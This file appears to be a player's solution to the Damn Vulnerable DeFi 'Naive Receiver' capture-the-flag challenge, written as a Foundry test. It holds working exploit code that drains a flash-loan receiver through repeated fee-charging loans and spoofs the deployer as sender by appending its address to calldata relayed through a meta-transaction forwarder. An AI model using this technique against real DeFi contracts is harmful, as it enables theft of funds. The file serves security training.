// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    struct Request {
            address from;
            address target;
            uint256 value;
            uint256 gas;
            uint256 nonce;
            bytes data;
            uint256 deadline;
    }

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    bytes32 private constant _REQUEST_TYPEHASH = keccak256(
        "Request(address from,address target,uint256 value,uint256 gas,uint256 nonce,bytes data,uint256 deadline"
    );

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        console.log(player);

        // flashloan
        console.log("receiver weth: ", weth.balanceOf(address(receiver)) / 10**18);
        console.log("pool weth: ", weth.balanceOf(address(pool)) / 10**18);
        console.log("deployer deposited weth: ", pool.deposits(deployer));

        //pool.flashLoan(receiver, address(weth), 0, "");

        bytes[] memory data = new bytes[](11);
        for (uint i = 0; i < 10; i++) {
          data[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, ""));
        }
        data[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(player))), deployer);
        bytes memory forwarderData = abi.encodeCall(pool.multicall, (data));

        // forwarder

        BasicForwarder.Request memory request = BasicForwarder.Request(player, address(pool), 0, 100000000, vm.getNonce(player), forwarderData, 1759497221);
        bytes32 requestHash = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        (bool success,) = address(forwarder).call(abi.encodeCall(BasicForwarder.execute, (request, signature)));
        require(success, "something wrong");

        console.log("receiver weth: ", weth.balanceOf(address(receiver)) / 10**18);
        console.log("fee weth deposits: ", pool.deposits(deployer) / 10**18);
        console.log("player tx count: ", vm.getNonce(player));
        console.log("player weth: ", weth.balanceOf(player) / 10**18);

        weth.transfer(recovery, weth.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
